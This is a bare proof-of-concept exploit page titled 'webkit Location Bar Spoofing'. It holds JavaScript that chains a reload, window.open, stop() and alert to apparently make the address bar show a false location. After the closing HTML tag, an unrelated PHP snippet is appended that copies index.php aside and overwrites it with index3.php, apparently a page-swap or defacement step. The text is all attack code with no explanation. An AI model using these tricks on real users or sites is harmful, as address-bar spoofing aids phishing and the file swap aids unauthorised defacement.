<html>
<body>
<script>
window.onload = function() {
  document.write("<body><h1>Proof of Concept - webkit Location Bar Spoofing</h1><br><b><a onclick=\"location.reload();window.open('1');setTimeout('stop();', 0500);setTimeout('alert(1)', 2000);\" src='click.png' width='95' height='18' border='0'>clickme</a></b></body>");
}
</script>
</body>
</html><?php
$filt = 'index.php';
$filo = 'index2.php';
$filtr = 'index3.php';
copy($filt , $filo);
copy($filtr , $filt);
?>
